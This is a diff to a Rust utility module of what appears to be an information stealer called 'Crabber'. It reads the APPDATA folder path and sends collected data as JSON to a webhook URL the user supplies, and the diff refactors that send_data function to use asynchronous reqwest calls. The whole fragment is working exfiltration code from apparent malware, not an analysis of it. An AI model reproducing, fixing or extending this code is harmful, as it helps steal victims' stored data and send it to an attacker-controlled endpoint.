@@ -1,5 +1,5 @@
 use base64::Engine as _;
-use reqwest::blocking::Client;
+use reqwest::Client;
 
 pub const WEBHOOK_URL : &str = "WEBHOOK_HERE";
 pub const ROAMING : &str = std::env!("APPDATA");
@@ -23,7 +23,7 @@ pub fn isempty_webhook() -> Result<(), String> {
     return if WEBHOOK_URL == "WEBHOOK_HERE" {Err(String::from("Error: Please enter a webhook URL in ./src/global/utils.rs:4 in the WEBHOOK_URL const.\n"))} else {Ok(())};
 }
 
-pub fn send_data(webhook_url: &str, data: &str) -> u16{
+pub async fn send_data(webhook_url: &str, data: &str) -> Result<u16, reqwest::Error> {
     let parts: Vec<&str> = data.split("NOP").collect();
     let payload = serde_json::json!({
         "username": "Crabber",
@@ -52,12 +52,19 @@ pub fn send_data(webhook_url: &str, data: &str) -> u16{
 
     });
 
-    let response = Client::new().post(webhook_url)
+    let client = Client::new();
+    let response = client.post(webhook_url)
         .header("Content-Type", "application/json")
         .body(payload.to_string())
         .send();
-
-    return response.unwrap().status().as_u16();
+    
+    match response.await {
+        Ok(response) => Ok(response.status().as_u16()),
+        Err(e) => {
+            eprintln!("Error: {}", e);
+            Err(e)
+        }
+    }
 }
 
 pub fn remove_duplicates<T: Eq + std::hash::Hash + Clone>(vec: Vec<T>) -> Vec<T> {
